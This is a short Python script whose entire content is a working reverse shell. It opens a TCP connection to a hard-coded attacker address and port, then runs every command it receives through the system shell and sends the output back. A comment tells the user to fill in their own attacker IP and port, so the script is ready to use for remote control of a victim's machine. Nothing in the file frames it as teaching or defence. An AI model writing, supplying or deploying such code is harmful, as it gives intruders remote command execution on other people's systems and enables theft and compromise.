
import socket
import subprocess
import os

# Replace 'attacker_ip' and 'attacker_port' with your attacker's IP address and port number
ATTACKER_IP = '192.168.15.162'
ATTACKER_PORT = 9999

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    
    while True:
        try:
            # Receive the command from the attacker
            command = s.recv(1024).decode('utf-8')
            if command in ['exit', 'quit']:
                break
            
            # Execute the command and get the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except Exception as e:
            s.send(str(e).encode('utf-8'))

    s.close()

if __name__ == "__main__":
    reverse_shell()
